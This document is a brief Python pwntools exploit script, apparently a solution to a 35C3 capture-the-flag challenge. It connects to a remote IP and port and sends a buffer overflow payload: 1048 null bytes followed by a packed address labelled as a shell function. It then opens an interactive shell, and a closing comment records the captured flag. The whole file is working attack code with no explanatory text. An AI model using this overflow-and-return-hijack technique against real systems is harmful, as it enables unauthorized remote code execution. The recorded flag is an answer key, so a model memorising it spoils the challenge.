#!/usr/bin/python
from pwn import *

r = remote('35.207.132.47', 22227)
context(os='linux', arch='amd64')

shell_add = 0x400897

payload = '\x00'*1024 + '\x00'*0x18 + p64(shell_add)

raw_input('@')
r.sendlineafter('Which environment variable do you want to read?', payload)

r.interactive()

# 35C3_b29a2800780d85cfc346ce5d64f52e59c8d12c14